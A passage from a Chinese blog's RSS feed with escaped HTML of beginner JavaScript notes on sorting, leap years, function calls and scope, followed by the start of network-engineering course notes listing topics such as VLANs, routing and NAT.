&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sort&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]) {
                    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;temp&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt;];
                    &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
                    &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;temp&lt;/span&gt;;
                }
            }
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sort&lt;/span&gt;([&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;]);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr1&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sort&lt;/span&gt;([&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;999&lt;/span&gt;]);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr2&lt;/span&gt;);
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;案例3判断闰年&#34;&gt;案例3：判断闰年&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 利用函数判断闰年
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;isRunYear&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;year&lt;/span&gt;) {
        &lt;span style=&#34;color:#75715e&#34;&gt;// 如果是闰年我们返回true，否则返回false
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;;
        &lt;span style=&#34;color:#75715e&#34;&gt;// 能被4整除并且不能被100整除，或者能被400整除
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;year&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;year&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;year&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
            &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;isRunYear&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;2000&lt;/span&gt;));
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;isRunYear&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1999&lt;/span&gt;));
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;函数可以调用另外一个函数&#34;&gt;函数可以调用另外一个函数&lt;/h3&gt;
&lt;p&gt;因为每个函数都是独立的代码块，用于完成特殊任务，因此经常会用到函数相互调用的情况。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 函数是可以相互调用的
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fn1&lt;/span&gt;() {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;)
        &lt;span style=&#34;color:#a6e22e&#34;&gt;fn2&lt;/span&gt;();	&lt;span style=&#34;color:#75715e&#34;&gt;// 在fn1函数里面调用了fn2函数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;fn1&lt;/span&gt;();
    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fn2&lt;/span&gt;() {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;);
    }
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fn1&lt;/span&gt;() {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;111&lt;/span&gt;);
        &lt;span style=&#34;color:#a6e22e&#34;&gt;fn2&lt;/span&gt;();
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;fn1&amp;#39;&lt;/span&gt;);
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fn2&lt;/span&gt;() {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;222&lt;/span&gt;);
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;fn2&amp;#39;&lt;/span&gt;);
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;fn1&lt;/span&gt;();			
	&lt;span style=&#34;color:#75715e&#34;&gt;// 111 222 fn2 fn1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;案例4用户输入年份输出当前年份2月份的天数&#34;&gt;案例4：用户输入年份，输出当前年份2月份的天数&lt;/h3&gt;
&lt;p&gt;如果是闰年，则2月份是29天，如果是平年，则2月份是28天。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 用户输入年份，输出当前年份2月份的天数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;backDay&lt;/span&gt;() {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;year&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prompt&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;请你输入年份：&amp;#39;&lt;/span&gt;);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;isRunYear&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;year&lt;/span&gt;)) {
            &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;当前年份是闰年2月份有29天&amp;#39;&lt;/span&gt;);
        } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
            &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;当前年份是平年2月份有28天&amp;#39;&lt;/span&gt;);
        }
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;backDay&lt;/span&gt;();
    
    &lt;span style=&#34;color:#75715e&#34;&gt;// 判断是否为闰年的函数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;isRunYear&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;year&lt;/span&gt;) {
        &lt;span style=&#34;color:#75715e&#34;&gt;// 如果是闰年我们返回true，否则返回false
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;;
        &lt;span style=&#34;color:#75715e&#34;&gt;// 能被4整除并且不能被100整除，或者能被400整除
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;year&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;year&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;year&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
            &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;;
    }
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;97-函数的两种声明方式&#34;&gt;9.7 函数的两种声明方式&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 函数的两种声明方式
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 1. 利用该函数关键字定义函数（命名函数）
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fn&lt;/span&gt;() {
        
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;fn&lt;/span&gt;();
    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 函数表达式（匿名函数）
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;变量名&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;() {};
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fun&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;aru&lt;/span&gt;){
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;我是函数表达式&amp;#39;&lt;/span&gt;);
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;aru&lt;/span&gt;);
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;fun&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pink老师&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#75715e&#34;&gt;// (1) fun 是变量名，不是函数名
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// (2) 函数表达式声明方式跟声明变量差不多，只不过变量里面存的是值而函数表达式里面存的是函数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// (3) 函数表达式也可以进行传递参数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;10-javascript-作用域&#34;&gt;10. JavaScript 作用域&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;能够说出JavaScript的两种作用域&lt;/li&gt;
&lt;li&gt;能够区分全局变量和局部变量&lt;/li&gt;
&lt;li&gt;能够说出如何在作用域链中查找变量的值&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;101-作用域&#34;&gt;10.1 作用域&lt;/h2&gt;
&lt;h3 id=&#34;1011-作用域概述&#34;&gt;10.1.1 作用域概述&lt;/h3&gt;
&lt;p&gt;通常来说，一段程序代码中所用到的名字并不总是有效和可用的，而限定这个名字的可用性的代码范围就是这个名字的作用域。作用域的使用提高了程序逻辑的局部性，增强了程序的可靠性，减少了名字冲突。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// JavaScript作用：就是代码名字（变量）在某个范围内起作用和效果，目的是为了提高程序的可靠性，更重要的是减少命名冲突
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;102-变量的作用域&#34;&gt;10.2 变量的作用域&lt;/h2&gt;
&lt;h2 id=&#34;103-作用域链&#34;&gt;10.3 作用域链&lt;/h2&gt;
- https://b40du.github.io/posts/note-heima-javascript-basic/ - This is a customized copyright.</description>
        </item>
    
    
    
        <item>
        <title>笔记-网络工程师</title>
        <link>https://b40du.github.io/posts/note-aqniu-network-engineer/</link>
        <pubDate>Wed, 01 Apr 2020 00:00:00 +0000</pubDate>
        
        <guid>https://b40du.github.io/posts/note-aqniu-network-engineer/</guid>
        <description>爆肚的杂货铺 https://b40du.github.io/posts/note-aqniu-network-engineer/ -&lt;h2 id=&#34;目录&#34;&gt;目录&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;第一章：计算机网络基础&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;计算机网络概述&lt;/li&gt;
&lt;li&gt;OSI参考模型与TCP IP（课件有误：SQL、NFS、RPC属于会话层）&lt;/li&gt;
&lt;li&gt;局域网基本原理&lt;/li&gt;
&lt;li&gt;IP基本原理&lt;/li&gt;
&lt;li&gt;TCP与UDP&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;第二章：网络设备操作入门&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;网络设备及其操作系统介绍&lt;/li&gt;
&lt;li&gt;命令行操作基础&lt;/li&gt;
&lt;li&gt;网络设备文件管理&lt;/li&gt;
&lt;li&gt;网络设备文件管理-操作实验&lt;/li&gt;
&lt;li&gt;网络设备升级操作ComwareV7msr2630&lt;/li&gt;
&lt;li&gt;网络设备基本调试&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;第三章：配置局域网交换&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;以太网交换机工作原理&lt;/li&gt;
&lt;li&gt;vlan配置&lt;/li&gt;
&lt;li&gt;vlan配置-实验&lt;/li&gt;
&lt;li&gt;生成树协议&lt;/li&gt;
&lt;li&gt;生成树协议-实验&lt;/li&gt;
&lt;li&gt;端口安全技术&lt;/li&gt;
&lt;li&gt;端口安全技术-实验&lt;/li&gt;
&lt;li&gt;配置链路聚合&lt;/li&gt;
&lt;li&gt;配置链路聚合-实验&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;第四章：高级TCP/IP知识&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;子网划分&lt;/li&gt;
&lt;li&gt;DNS域名系统&lt;/li&gt;
&lt;li&gt;文件传输协议&lt;/li&gt;
&lt;li&gt;DHCP&lt;/li&gt;
&lt;li&gt;IPv6&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;第五章：配置IP路由&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;IP路由原理&lt;/li&gt;
&lt;li&gt;直连路由和静态路由&lt;/li&gt;
&lt;li&gt;直连路由和静态路由-实验&lt;/li&gt;
&lt;li&gt;路由协议概述&lt;/li&gt;
&lt;li&gt;RIP原理&lt;/li&gt;
&lt;li&gt;RIP原理-实验&lt;/li&gt;
&lt;li&gt;OSPF基础&lt;/li&gt;
&lt;li&gt;OSPF基础-实验&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;第六章：配置安全的分支网络&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;用访问控制列表实验包过滤&lt;/li&gt;
&lt;li&gt;用访问控制列表实验包过滤-实验&lt;/li&gt;
&lt;li&gt;网络地址转换&lt;/li&gt;
&lt;li&gt;网络地址转换-实验&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;第七章：广域网连接和互联&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;配置HDLC&lt;/li&gt;
&lt;li&gt;配置PPP&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;第一章计算机网络基础&#34;&gt;第一章：计算机网络基础&lt;/h1&gt;
&lt;h2 id=&#34;1-计算机网络概述&#34;&gt;1. 计算机网络概述&lt;/h2&gt;
&lt;h3 id=&#34;课程目标&#34;&gt;课程目标&lt;/h3&gt;
&lt;p&gt;学习完本课程，你应该能够：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;掌握计算机网络的定义和基本功能&lt;/li&gt;
&lt;li&gt;了解计算机网络的演进过程&lt;/li&gt;
